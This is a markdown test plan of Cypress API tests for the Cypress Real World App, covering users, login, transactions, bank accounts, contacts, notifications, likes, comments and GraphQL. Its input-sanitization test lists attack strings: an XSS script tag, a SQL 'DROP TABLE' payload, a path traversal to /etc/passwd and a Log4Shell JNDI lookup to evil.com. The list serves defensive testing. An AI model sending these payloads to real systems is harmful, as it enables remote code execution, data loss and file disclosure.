# API Test Cases

## Overview

This document contains comprehensive API test cases for the Cypress Real World App backend services. The API provides endpoints for user management, authentication, transactions, bank accounts, contacts, notifications, and social features.

## API Base Configuration

```typescript
const API_BASE_URL = Cypress.env("apiUrl"); // http://localhost:3001
const API_ENDPOINTS = {
  users: `${API_BASE_URL}/users`,
  auth: `${API_BASE_URL}/login`,
  transactions: `${API_BASE_URL}/transactions`,
  bankAccounts: `${API_BASE_URL}/bankaccounts`,
  contacts: `${API_BASE_URL}/contacts`,
  notifications: `${API_BASE_URL}/notifications`,
  comments: `${API_BASE_URL}/comments`,
  likes: `${API_BASE_URL}/likes`,
  graphql: `${API_BASE_URL}/graphql`,
};
```

---

## User Management API Tests

### TC-API-USER-001: Get User List

**Endpoint**: `GET /users`
**Objective**: Verify user list retrieval with proper authentication

**Test Steps**:

1. Authenticate user
2. Send GET request to /users
3. Verify response structure and data

**Expected Results**:

- Status: 200 OK
- Response contains user list
- Proper pagination (if implemented)
- User data properly formatted

**Cypress Implementation**:

```typescript
describe("Users API", () => {
  beforeEach(() => {
    cy.task("db:seed");
    cy.database("filter", "users").then((users: User[]) => {
      cy.loginByApi(users[0].username);
    });
  });

  it("should get list of users", () => {
    cy.request("GET", `${API_BASE_URL}/users`).then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body).to.have.property("results");
      expect(response.body.results).to.be.an("array");
      expect(response.body.results.length).to.be.greaterThan(0);

      // Verify user object structure
      const user = response.body.results[0];
      expect(user).to.have.property("id");
      expect(user).to.have.property("firstName");
      expect(user).to.have.property("lastName");
      expect(user).to.have.property("username");
      expect(user).to.not.have.property("password"); // Sensitive data excluded
    });
  });

  it("should support user search with query parameter", () => {
    cy.request("GET", `${API_BASE_URL}/users?q=test`).then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body.results).to.be.an("array");
      // Verify search results contain query term
    });
  });
});
```

---

### TC-API-USER-002: Get User by ID

**Endpoint**: `GET /users/:userId`
**Objective**: Verify individual user retrieval

**Test Steps**:

1. Authenticate user
2. Send GET request with valid user ID
3. Verify user data returned

**Expected Results**:

- Status: 200 OK
- User data returned
- Sensitive information excluded

**Cypress Implementation**:

```typescript
it("should get user by ID", () => {
  cy.database("find", "users").then((user: User) => {
    cy.request("GET", `${API_BASE_URL}/users/${user.id}`).then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body.user).to.have.property("id", user.id);
      expect(response.body.user).to.have.property("firstName");
      expect(response.body.user).to.not.have.property("password");
    });
  });
});

it("should return 404 for non-existent user", () => {
  cy.request({
    method: "GET",
    url: `${API_BASE_URL}/users/non-existent-id`,
    failOnStatusCode: false,
  }).then((response) => {
    expect(response.status).to.eq(404);
  });
});
```

---

### TC-API-USER-003: Create User

**Endpoint**: `POST /users`
**Objective**: Verify user creation functionality

**Test Data**:

```json
{
  "firstName": "John",
  "lastName": "Doe",
  "username": "johndoe123",
  "password": "SecurePass123!",
  "email": "john.doe@example.com",
  "phoneNumber": "555-123-4567"
}
```

**Cypress Implementation**:

```typescript
it("should create new user with valid data", () => {
  const newUser = {
    firstName: "John",
    lastName: "Doe",
    username: `testuser_${Date.now()}`,
    password: "SecurePass123!",
    email: `test_${Date.now()}@example.com`,
    phoneNumber: "555-123-4567",
  };

  cy.request("POST", `${API_BASE_URL}/users`, newUser).then((response) => {
    expect(response.status).to.eq(201);
    expect(response.body.user).to.have.property("id");
    expect(response.body.user.firstName).to.eq(newUser.firstName);
    expect(response.body.user.username).to.eq(newUser.username);
    expect(response.body.user).to.not.have.property("password");
  });
});

it("should reject user creation with invalid data", () => {
  const invalidUser = {
    firstName: "", // Empty required field
    lastName: "Doe",
    username: "test",
    password: "123", // Weak password
  };

  cy.request({
    method: "POST",
    url: `${API_BASE_URL}/users`,
    body: invalidUser,
    failOnStatusCode: false,
  }).then((response) => {
    expect(response.status).to.eq(422);
    expect(response.body).to.have.property("errors");
  });
});
```

---

## Authentication API Tests

### TC-API-AUTH-001: User Login

**Endpoint**: `POST /login`
**Objective**: Verify user authentication

**Test Steps**:

1. Send POST request with valid credentials
2. Verify authentication response
3. Verify session/token creation

**Cypress Implementation**:

```typescript
describe("Authentication API", () => {
  beforeEach(() => {
    cy.task("db:seed");
  });

  it("should authenticate user with valid credentials", () => {
    cy.database("find", "users").then((user: User) => {
      cy.request("POST", `${API_BASE_URL}/login`, {
        username: user.username,
        password: "s3cret",
      }).then((response) => {
        expect(response.status).to.eq(200);
        expect(response.body.user).to.have.property("id");
        expect(response.body.user.username).to.eq(user.username);

        // Verify session cookie or token
        expect(response.headers).to.have.property("set-cookie");
      });
    });
  });

  it("should reject invalid credentials", () => {
    cy.request({
      method: "POST",
      url: `${API_BASE_URL}/login`,
      body: {
        username: "nonexistent",
        password: "wrongpassword",
      },
      failOnStatusCode: false,
    }).then((response) => {
      expect(response.status).to.eq(401);
      expect(response.body).to.have.property("error");
    });
  });
});
```

---

## Transaction API Tests

### TC-API-TXN-001: Get Transactions

**Endpoint**: `GET /transactions`
**Objective**: Verify transaction list retrieval

**Cypress Implementation**:

```typescript
describe("Transactions API", () => {
  beforeEach(() => {
    cy.task("db:seed");
    cy.database("filter", "users").then((users: User[]) => {
      cy.loginByApi(users[0].username);
    });
  });

  it("should get user transactions", () => {
    cy.request("GET", `${API_BASE_URL}/transactions`).then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body).to.have.property("results");
      expect(response.body.results).to.be.an("array");

      if (response.body.results.length > 0) {
        const transaction = response.body.results[0];
        expect(transaction).to.have.property("id");
        expect(transaction).to.have.property("amount");
        expect(transaction).to.have.property("description");
        expect(transaction).to.have.property("status");
      }
    });
  });

  it("should support transaction filtering", () => {
    cy.request("GET", `${API_BASE_URL}/transactions?status=complete`).then((response) => {
      expect(response.status).to.eq(200);
      response.body.results.forEach((transaction: any) => {
        expect(transaction.status).to.eq("complete");
      });
    });
  });
});
```

---

### TC-API-TXN-002: Create Transaction

**Endpoint**: `POST /transactions`
**Objective**: Verify transaction creation

**Cypress Implementation**:

```typescript
it("should create payment transaction", () => {
  cy.database("filter", "users").then((users: User[]) => {
    const sender = users[0];
    const recipient = users[1];

    cy.loginByApi(sender.username).then(() => {
      const transactionData = {
        type: "payment",
        amount: 2500, // $25.00 in cents
        description: "API test payment",
        receiverId: recipient.id,
        privacyLevel: "public",
      };

      cy.request("POST", `${API_BASE_URL}/transactions`, transactionData).then((response) => {
        expect(response.status).to.eq(201);
        expect(response.body.transaction).to.have.property("id");
        expect(response.body.transaction.amount).to.eq(transactionData.amount);
        expect(response.body.transaction.description).to.eq(transactionData.description);
        expect(response.body.transaction.status).to.eq("complete");
      });
    });
  });
});

it("should create payment request", () => {
  cy.database("filter", "users").then((users: User[]) => {
    const requester = users[0];
    const recipient = users[1];

    cy.loginByApi(requester.username).then(() => {
      const requestData = {
        type: "request",
        amount: 5000, // $50.00 in cents
        description: "API test request",
        receiverId: recipient.id,
        privacyLevel: "contacts",
      };

      cy.request("POST", `${API_BASE_URL}/transactions`, requestData).then((response) => {
        expect(response.status).to.eq(201);
        expect(response.body.transaction.status).to.eq("pending");
        expect(response.body.transaction.type).to.eq("request");
      });
    });
  });
});
```

---

### TC-API-TXN-003: Update Transaction

**Endpoint**: `PATCH /transactions/:transactionId`
**Objective**: Verify transaction updates (e.g., accepting requests)

**Cypress Implementation**:

```typescript
it("should accept payment request", () => {
  cy.database("filter", "users").then((users: User[]) => {
    const requester = users[0];
    const recipient = users[1];

    // Create payment request
    cy.loginByApi(requester.username);
    cy.createTransaction({
      type: "request",
      amount: 3000,
      description: "Test request",
      receiverId: recipient.id,
    }).then((transaction) => {
      // Accept request as recipient
      cy.loginByApi(recipient.username).then(() => {
        cy.request("PATCH", `${API_BASE_URL}/transactions/${transaction.id}`, {
          status: "complete",
        }).then((response) => {
          expect(response.status).to.eq(200);
          expect(response.body.transaction.status).to.eq("complete");
        });
      });
    });
  });
});
```

---

## Bank Account API Tests

### TC-API-BANK-001: Get Bank Accounts

**Endpoint**: `GET /bankaccounts`
**Objective**: Verify bank account list retrieval

**Cypress Implementation**:

```typescript
describe("Bank Accounts API", () => {
  beforeEach(() => {
    cy.task("db:seed");
    cy.database("filter", "users").then((users: User[]) => {
      cy.loginByApi(users[0].username);
    });
  });

  it("should get user bank accounts", () => {
    cy.request("GET", `${API_BASE_URL}/bankaccounts`).then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body).to.have.property("results");
      expect(response.body.results).to.be.an("array");

      if (response.body.results.length > 0) {
        const account = response.body.results[0];
        expect(account).to.have.property("id");
        expect(account).to.have.property("bankName");
        expect(account).to.have.property("accountNumber");
        expect(account).to.have.property("routingNumber");
      }
    });
  });
});
```

---

### TC-API-BANK-002: Create Bank Account

**Endpoint**: `POST /bankaccounts`
**Objective**: Verify bank account creation

**Cypress Implementation**:

```typescript
it("should create bank account with valid data", () => {
  const bankAccountData = {
    bankName: "Test Bank",
    accountNumber: "123456789",
    routingNumber: "987654321",
  };

  cy.request("POST", `${API_BASE_URL}/bankaccounts`, bankAccountData).then((response) => {
    expect(response.status).to.eq(201);
    expect(response.body.bankaccount).to.have.property("id");
    expect(response.body.bankaccount.bankName).to.eq(bankAccountData.bankName);
    expect(response.body.bankaccount.accountNumber).to.eq(bankAccountData.accountNumber);
  });
});

it("should validate bank account data", () => {
  const invalidData = {
    bankName: "", // Empty required field
    accountNumber: "123", // Too short
    routingNumber: "invalid", // Invalid format
  };

  cy.request({
    method: "POST",
    url: `${API_BASE_URL}/bankaccounts`,
    body: invalidData,
    failOnStatusCode: false,
  }).then((response) => {
    expect(response.status).to.eq(422);
    expect(response.body).to.have.property("errors");
  });
});
```

---

## Contact Management API Tests

### TC-API-CONTACT-001: Get Contacts

**Endpoint**: `GET /contacts`
**Objective**: Verify contact list retrieval

**Cypress Implementation**:

```typescript
describe("Contacts API", () => {
  beforeEach(() => {
    cy.task("db:seed");
    cy.database("filter", "users").then((users: User[]) => {
      cy.loginByApi(users[0].username);
    });
  });

  it("should get user contacts", () => {
    cy.request("GET", `${API_BASE_URL}/contacts`).then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body).to.have.property("results");
      expect(response.body.results).to.be.an("array");
    });
  });
});
```

---

### TC-API-CONTACT-002: Add Contact

**Endpoint**: `POST /contacts`
**Objective**: Verify contact addition

**Cypress Implementation**:

```typescript
it("should add user as contact", () => {
  cy.database("filter", "users").then((users: User[]) => {
    const user = users[0];
    const contactUser = users[1];

    cy.loginByApi(user.username).then(() => {
      cy.request("POST", `${API_BASE_URL}/contacts`, {
        contactUserId: contactUser.id,
      }).then((response) => {
        expect(response.status).to.eq(201);
        expect(response.body.contact).to.have.property("id");
        expect(response.body.contact.userId).to.eq(user.id);
        expect(response.body.contact.contactUserId).to.eq(contactUser.id);
      });
    });
  });
});
```

---

## Notification API Tests

### TC-API-NOTIF-001: Get Notifications

**Endpoint**: `GET /notifications`
**Objective**: Verify notification retrieval

**Cypress Implementation**:

```typescript
describe("Notifications API", () => {
  beforeEach(() => {
    cy.task("db:seed");
    cy.database("filter", "users").then((users: User[]) => {
      cy.loginByApi(users[0].username);
    });
  });

  it("should get user notifications", () => {
    cy.request("GET", `${API_BASE_URL}/notifications`).then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body).to.have.property("results");
      expect(response.body.results).to.be.an("array");

      if (response.body.results.length > 0) {
        const notification = response.body.results[0];
        expect(notification).to.have.property("id");
        expect(notification).to.have.property("type");
        expect(notification).to.have.property("message");
        expect(notification).to.have.property("isRead");
      }
    });
  });
});
```

---

### TC-API-NOTIF-002: Mark Notification as Read

**Endpoint**: `PATCH /notifications/:notificationId`
**Objective**: Verify notification status updates

**Cypress Implementation**:

```typescript
it("should mark notification as read", () => {
  // First get notifications
  cy.request("GET", `${API_BASE_URL}/notifications`).then((response) => {
    if (response.body.results.length > 0) {
      const notification = response.body.results[0];

      cy.request("PATCH", `${API_BASE_URL}/notifications/${notification.id}`, {
        isRead: true,
      }).then((updateResponse) => {
        expect(updateResponse.status).to.eq(200);
        expect(updateResponse.body.notification.isRead).to.be.true;
      });
    }
  });
});
```

---

## Social Features API Tests

### TC-API-SOCIAL-001: Like Transaction

**Endpoint**: `POST /likes`
**Objective**: Verify transaction like functionality

**Cypress Implementation**:

```typescript
describe("Social Features API", () => {
  beforeEach(() => {
    cy.task("db:seed");
    cy.database("filter", "users").then((users: User[]) => {
      cy.loginByApi(users[0].username);
    });
  });

  it("should like transaction", () => {
    // Get a transaction to like
    cy.request("GET", `${API_BASE_URL}/transactions`).then((response) => {
      if (response.body.results.length > 0) {
        const transaction = response.body.results[0];

        cy.request("POST", `${API_BASE_URL}/likes`, {
          transactionId: transaction.id,
        }).then((likeResponse) => {
          expect(likeResponse.status).to.eq(201);
          expect(likeResponse.body.like).to.have.property("id");
          expect(likeResponse.body.like.transactionId).to.eq(transaction.id);
        });
      }
    });
  });

  it("should unlike transaction", () => {
    // First like a transaction, then unlike it
    cy.request("GET", `${API_BASE_URL}/transactions`).then((response) => {
      if (response.body.results.length > 0) {
        const transaction = response.body.results[0];

        // Like transaction
        cy.request("POST", `${API_BASE_URL}/likes`, {
          transactionId: transaction.id,
        }).then((likeResponse) => {
          const likeId = likeResponse.body.like.id;

          // Unlike transaction
          cy.request("DELETE", `${API_BASE_URL}/likes/${likeId}`).then((unlikeResponse) => {
            expect(unlikeResponse.status).to.eq(204);
          });
        });
      }
    });
  });
});
```

---

### TC-API-SOCIAL-002: Comment on Transaction

**Endpoint**: `POST /comments`
**Objective**: Verify transaction comment functionality

**Cypress Implementation**:

```typescript
it("should add comment to transaction", () => {
  cy.request("GET", `${API_BASE_URL}/transactions`).then((response) => {
    if (response.body.results.length > 0) {
      const transaction = response.body.results[0];

      cy.request("POST", `${API_BASE_URL}/comments`, {
        transactionId: transaction.id,
        content: "Great transaction!",
      }).then((commentResponse) => {
        expect(commentResponse.status).to.eq(201);
        expect(commentResponse.body.comment).to.have.property("id");
        expect(commentResponse.body.comment.content).to.eq("Great transaction!");
        expect(commentResponse.body.comment.transactionId).to.eq(transaction.id);
      });
    }
  });
});
```

---

## GraphQL API Tests

### TC-API-GQL-001: GraphQL Query

**Endpoint**: `POST /graphql`
**Objective**: Verify GraphQL query functionality

**Cypress Implementation**:

```typescript
describe("GraphQL API", () => {
  beforeEach(() => {
    cy.task("db:seed");
    cy.database("filter", "users").then((users: User[]) => {
      cy.loginByApi(users[0].username);
    });
  });

  it("should execute GraphQL user query", () => {
    const query = `
      query GetUser($id: ID!) {
        user(id: $id) {
          id
          firstName
          lastName
          username
        }
      }
    `;

    cy.database("find", "users").then((user: User) => {
      cy.request("POST", `${API_BASE_URL}/graphql`, {
        query,
        variables: { id: user.id },
      }).then((response) => {
        expect(response.status).to.eq(200);
        expect(response.body.data.user).to.have.property("id", user.id);
        expect(response.body.data.user).to.have.property("firstName");
        expect(response.body.data.user).to.have.property("lastName");
      });
    });
  });

  it("should execute GraphQL mutation", () => {
    const mutation = `
      mutation CreateBankAccount($bankName: String!, $accountNumber: String!, $routingNumber: String!) {
        createBankAccount(bankName: $bankName, accountNumber: $accountNumber, routingNumber: $routingNumber) {
          id
          bankName
          accountNumber
        }
      }
    `;

    cy.request("POST", `${API_BASE_URL}/graphql`, {
      query: mutation,
      variables: {
        bankName: "GraphQL Test Bank",
        accountNumber: "987654321",
        routingNumber: "123456789",
      },
    }).then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body.data.createBankAccount).to.have.property("id");
      expect(response.body.data.createBankAccount.bankName).to.eq("GraphQL Test Bank");
    });
  });
});
```

---

## Error Handling and Edge Cases

### TC-API-ERROR-001: Authentication Required

**Objective**: Verify protected endpoints require authentication

**Cypress Implementation**:

```typescript
describe("API Error Handling", () => {
  it("should require authentication for protected endpoints", () => {
    const protectedEndpoints = [
      "GET /users",
      "GET /transactions",
      "GET /bankaccounts",
      "GET /contacts",
      "GET /notifications",
    ];

    protectedEndpoints.forEach((endpoint) => {
      const [method, path] = endpoint.split(" ");

      cy.request({
        method,
        url: `${API_BASE_URL}${path}`,
        failOnStatusCode: false,
      }).then((response) => {
        expect(response.status).to.eq(401);
      });
    });
  });
});
```

---

### TC-API-ERROR-002: Rate Limiting

**Objective**: Verify API rate limiting (if implemented)

**Cypress Implementation**:

```typescript
it("should enforce rate limiting", () => {
  cy.database("find", "users").then((user: User) => {
    cy.loginByApi(user.username).then(() => {
      // Make multiple rapid requests
      const requests = Array.from({ length: 100 }, () =>
        cy.request({
          method: "GET",
          url: `${API_BASE_URL}/users`,
          failOnStatusCode: false,
        })
      );

      // Check if rate limiting kicks in
      cy.wrap(Promise.all(requests)).then((responses: any[]) => {
        const rateLimitedResponses = responses.filter((r) => r.status === 429);
        if (rateLimitedResponses.length > 0) {
          expect(rateLimitedResponses[0].status).to.eq(429);
          expect(rateLimitedResponses[0].headers).to.have.property("retry-after");
        }
      });
    });
  });
});
```

---

### TC-API-ERROR-003: Invalid JSON Handling

**Objective**: Verify proper handling of malformed requests

**Cypress Implementation**:

```typescript
it("should handle invalid JSON gracefully", () => {
  cy.database("find", "users").then((user: User) => {
    cy.loginByApi(user.username).then(() => {
      cy.request({
        method: "POST",
        url: `${API_BASE_URL}/transactions`,
        body: "invalid json string",
        headers: {
          "Content-Type": "application/json",
        },
        failOnStatusCode: false,
      }).then((response) => {
        expect(response.status).to.eq(400);
        expect(response.body).to.have.property("error");
      });
    });
  });
});
```

---

## Performance and Load Testing

### TC-API-PERF-001: Response Time Benchmarks

**Objective**: Verify API response times meet performance requirements

**Cypress Implementation**:

```typescript
describe("API Performance", () => {
  it("should meet response time benchmarks", () => {
    const endpoints = [
      { method: "GET", path: "/users", maxTime: 500 },
      { method: "GET", path: "/transactions", maxTime: 1000 },
      { method: "GET", path: "/bankaccounts", maxTime: 300 },
      { method: "GET", path: "/notifications", maxTime: 500 },
    ];

    cy.database("find", "users").then((user: User) => {
      cy.loginByApi(user.username).then(() => {
        endpoints.forEach((endpoint) => {
          const startTime = Date.now();

          cy.request(endpoint.method, `${API_BASE_URL}${endpoint.path}`).then(() => {
            const responseTime = Date.now() - startTime;
            expect(responseTime).to.be.lessThan(endpoint.maxTime);
          });
        });
      });
    });
  });
});
```

---

## Data Validation and Security

### TC-API-SEC-001: Input Sanitization

**Objective**: Verify API properly sanitizes input data

**Cypress Implementation**:

```typescript
describe("API Security", () => {
  it("should sanitize input data", () => {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      "DROP TABLE users;",
      "../../etc/passwd",
      "${jndi:ldap://evil.com/a}",
    ];

    cy.database("find", "users").then((user: User) => {
      cy.loginByApi(user.username).then(() => {
        maliciousInputs.forEach((maliciousInput) => {
          cy.request({
            method: "POST",
            url: `${API_BASE_URL}/transactions`,
            body: {
              type: "payment",
              amount: 100,
              description: maliciousInput,
              receiverId: user.id,
            },
            failOnStatusCode: false,
          }).then((response) => {
            // Should either reject the input or sanitize it
            if (response.status === 201) {
              expect(response.body.transaction.description).to.not.contain("<script>");
              expect(response.body.transaction.description).to.not.contain("DROP TABLE");
            } else {
              expect(response.status).to.eq(422);
            }
          });
        });
      });
    });
  });
});
```

---

## API Documentation and Contract Testing

### TC-API-DOC-001: OpenAPI Specification Compliance

**Objective**: Verify API responses match OpenAPI specification (if available)

**Cypress Implementation**:

```typescript
// This would require OpenAPI specification file
it("should match OpenAPI specification", () => {
  // Implementation would validate response schemas against OpenAPI spec
  // This is typically done with tools like swagger-parser or ajv
});
```

---

## Cleanup and Test Data Management

### TC-API-CLEANUP-001: Test Data Cleanup

**Objective**: Ensure proper cleanup of test data

**Cypress Implementation**:

```typescript
describe("Test Data Management", () => {
  afterEach(() => {
    // Clean up any test data created during tests
    cy.task("db:seed"); // Reset to clean state
  });

  it("should not affect other tests with data changes", () => {
    // Verify test isolation
    cy.database("filter", "users").then((users: User[]) => {
      expect(users.length).to.be.greaterThan(0);
      // Verify expected test data is present
    });
  });
});
```
